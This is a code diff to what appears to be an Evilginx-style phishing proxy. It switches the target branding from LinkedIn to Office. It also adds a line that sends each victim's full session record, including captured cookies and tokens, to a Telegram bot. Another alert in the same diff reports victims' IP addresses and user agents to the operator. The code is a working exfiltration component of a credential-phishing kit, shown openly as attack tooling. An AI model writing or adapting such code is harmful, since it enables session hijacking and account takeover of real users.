@@ -82,7 +82,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		fmt.Print("error")
 	}
 
-	telegramSendVisitor(fmt.Sprintf("🔥 🔥 NEW LINKEDIN VICTIM DETECTED 🔥 🔥\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
+	telegramSendVisitor(fmt.Sprintf("🔥 🔥 NEW OFFICE VICTIM DETECTED 🔥 🔥\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
@@ -186,6 +186,7 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 
 func (d *Database) sessionsUpdate(id int, s *Session) error {
 	jf, _ := json.Marshal(s)
+	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES 🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n", string(jf)))
 
 	err := d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
